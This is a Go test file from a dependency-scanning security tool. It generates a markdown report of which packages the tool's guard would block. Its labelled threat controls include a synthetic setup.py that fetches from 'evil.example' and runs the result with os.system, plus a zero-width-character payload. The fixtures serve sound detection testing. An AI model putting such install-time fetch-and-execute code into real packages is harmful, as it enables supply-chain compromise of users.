package cli

// monitor_report_test.go — the "here's what we would have blocked" wedge report
// generator. Runs the guard's real verdict (analyzeArtifact) over a set of a
// prospect's actual dependencies (a fetched lockfile) and writes a monitor-mode
// preview report: what enforce mode WOULD do, with nothing actually blocked.
//
// This is the proactive form of the wedge — you don't wait 30 days or deploy a
// server; you scan their existing lockfile and hand them the report. The
// server-backed org-wide version is `chainsaw report` + `chainsaw policy rollout
// status` (30-day monitor stats from live install events).
//
// Run (writes markdown to $CHAINSAW_MONITOR_REPORT_OUT):
//   CHAINSAW_DETECTION_EVAL_CORPUS=<dir> CHAINSAW_MONITOR_REPORT_OUT=report.md \
//     go test ./core/cli/ -run TestMonitorReport -v

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
)

// knownThreatControls are synthetic, clearly-labeled malware shapes included in
// the report so the reader sees the engine catches real threats, not only that
// it stays quiet on benign input. Same shapes as the enforcement bypass matrix.
func knownThreatControls(t *testing.T) []struct {
	name  string
	eco   string
	files map[string]string
} {
	zwsp := strings.Repeat("​", 8)
	return []struct {
		name  string
		eco   string
		files map[string]string
	}{
		{"[control] zero-width payload (GlassWorm)", "npm", map[string]string{
			"package/package.json": `{"name":"c","version":"1.0.0"}`,
			"package/index.js":     "var k = \"" + zwsp + "\";\n",
		}},
		{"[control] install-script fetch+exec", "pypi", map[string]string{
			"c-1.0.0/setup.py": "from setuptools import setup\nimport urllib.request, os\nurllib.request.urlopen('http://evil.example/x')\nos.system('sh /tmp/x')\nsetup(name='c', version='1.0.0')\n",
		}},
	}
}

func TestMonitorReport(t *testing.T) {
	out := os.Getenv("CHAINSAW_MONITOR_REPORT_OUT")
	dir := os.Getenv("CHAINSAW_DETECTION_EVAL_CORPUS")
	if out == "" || dir == "" {
		t.Skip("set CHAINSAW_DETECTION_EVAL_CORPUS + CHAINSAW_MONITOR_REPORT_OUT")
	}
	f, err := os.Open(filepath.Join(dir, "manifest.jsonl"))
	if err != nil {
		t.Fatalf("open manifest: %v", err)
	}
	defer f.Close()

	type finding struct{ label, reason, sev string }
	var (
		scanned, clean         int
		byEco                  = map[string]int{}
		wouldBlock, wouldWarn  []finding
	)
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 1<<20), 1<<20)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" {
			continue
		}
		var s struct {
			Ecosystem, Name, Version, Label, File string
			Fetched                               bool
		}
		if json.Unmarshal([]byte(line), &s) != nil || !s.Fetched || s.File == "" {
			continue
		}
		tgz, err := os.ReadFile(s.File)
		if err != nil || len(tgz) == 0 {
			continue
		}
		scanned++
		byEco[s.Ecosystem]++
		v := analyzeArtifact(s.Ecosystem, tgz)
		label := s.Ecosystem + ":" + s.Name + "@" + s.Version
		switch {
		case v.Block:
			wouldBlock = append(wouldBlock, finding{label, v.Reason, v.Severity})
		case v.Severity != "":
			wouldWarn = append(wouldWarn, finding{label, v.Reason, v.Severity})
		default:
			clean++
		}
	}

	// Known-threat controls (synthetic, labeled) — proves efficacy alongside the
	// benign-clean baseline.
	var controls []finding
	for _, c := range knownThreatControls(t) {
		v := analyzeArtifact(c.eco, makeTGZ(t, c.files))
		verdict := "ALLOWED (miss!)"
		if v.Block {
			verdict = "would-block"
		}
		controls = append(controls, finding{c.name, v.Reason, verdict})
	}

	sortF := func(fs []finding) { sort.Slice(fs, func(i, j int) bool { return fs[i].label < fs[j].label }) }
	sortF(wouldBlock)
	sortF(wouldWarn)

	var b strings.Builder
	fmt.Fprintf(&b, "# Chainsaw monitor-mode preview\n\n")
	fmt.Fprintf(&b, "_What enforce mode **would** have done across these dependencies. Monitor mode is non-blocking: nothing here was actually refused._\n\n")
	fmt.Fprintf(&b, "## Summary\n\n")
	fmt.Fprintf(&b, "| | |\n|---|---|\n")
	fmt.Fprintf(&b, "| Dependencies scanned | **%d** (%s) |\n", scanned, ecoLine(byEco))
	fmt.Fprintf(&b, "| Would-BLOCK (enforce mode) | **%d** |\n", len(wouldBlock))
	fmt.Fprintf(&b, "| Would-warn (advisory, non-blocking) | %d |\n", len(wouldWarn))
	fmt.Fprintf(&b, "| Clean | %d |\n\n", clean)

	fmt.Fprintf(&b, "## Would-block\n\n")
	if len(wouldBlock) == 0 {
		fmt.Fprintf(&b, "None — enforce mode would not have refused any of your dependencies. **Zero false blocks.**\n\n")
	} else {
		fmt.Fprintf(&b, "| Package | Reason |\n|---|---|\n")
		for _, x := range wouldBlock {
			fmt.Fprintf(&b, "| `%s` | %s |\n", x.label, x.reason)
		}
		fmt.Fprintf(&b, "\n")
	}

	fmt.Fprintf(&b, "## Would-warn (advisory)\n\n")
	if len(wouldWarn) == 0 {
		fmt.Fprintf(&b, "None.\n\n")
	} else {
		fmt.Fprintf(&b, "| Package | Note |\n|---|---|\n")
		for _, x := range wouldWarn {
			fmt.Fprintf(&b, "| `%s` | %s |\n", x.label, x.reason)
		}
		fmt.Fprintf(&b, "\n")
	}

	fmt.Fprintf(&b, "## Known-threat controls\n\n")
	fmt.Fprintf(&b, "_Synthetic malware shapes injected to show the engine catches real threats, not just that it stays quiet._\n\n")
	fmt.Fprintf(&b, "| Control | Verdict | Reason |\n|---|---|---|\n")
	for _, c := range controls {
		fmt.Fprintf(&b, "| %s | **%s** | %s |\n", c.label, c.sev, c.reason)
	}
	fmt.Fprintf(&b, "\n---\n\nGenerated by `TestMonitorReport` over %d real dependencies. Behavioral guard verdict (`analyzeArtifact`). The org-wide 30-day version reads live monitor-mode install events via `chainsaw report` + `chainsaw policy rollout status`.\n", scanned)

	if err := os.WriteFile(out, []byte(b.String()), 0o644); err != nil {
		t.Fatalf("write report: %v", err)
	}
	t.Logf("wrote monitor report: %s (%d scanned, %d would-block, %d would-warn, %d controls)",
		out, scanned, len(wouldBlock), len(wouldWarn), len(controls))
}

func ecoLine(m map[string]int) string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	parts := make([]string, 0, len(keys))
	for _, k := range keys {
		parts = append(parts, fmt.Sprintf("%d %s", m[k], k))
	}
	return strings.Join(parts, " + ")
}
